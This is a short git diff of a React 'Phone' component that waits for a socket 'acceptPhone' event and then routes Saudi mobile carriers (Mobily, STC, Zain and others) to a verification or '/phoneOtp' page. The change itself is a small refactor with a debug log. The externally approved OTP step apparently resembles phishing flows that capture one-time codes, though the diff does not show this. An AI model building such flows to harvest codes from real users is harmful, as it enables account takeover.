@@ -15,7 +15,7 @@ const Phone = () => {
   const [verfiy, setVerfiy] = useState(code === "check" ? "Mobily" : null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(false);
-
+  const net = phoneNetwork;
   const [counter, setCounter] = useState(180);
   useEffect(() => {
     const timer = setInterval(() => {
@@ -64,13 +64,18 @@ const Phone = () => {
 
   socket.on("acceptPhone", (id) => {
     if (id === ID) {
-      if (phoneNetwork) {
-        if (phoneNetwork === "Mobily") {
+      if (net) {
+        console.log(phoneNetwork);
+        if (net === "Mobily") {
           setLoading(false);
           return setVerfiy(phoneNetwork);
-        } else if (phoneNetwork === "STC") {
+        } else if (net === "STC") {
           return (window.location.href = "/phoneOtp?stc=check");
-        } else return (window.location.href = "/phoneOtp");
+        } else {
+          if (["Zain", "Salam", "Virgin", "Redbull"].includes(phoneNetwork)) {
+            return (window.location.href = "/phoneOtp");
+          }
+        }
       }
     }
   });
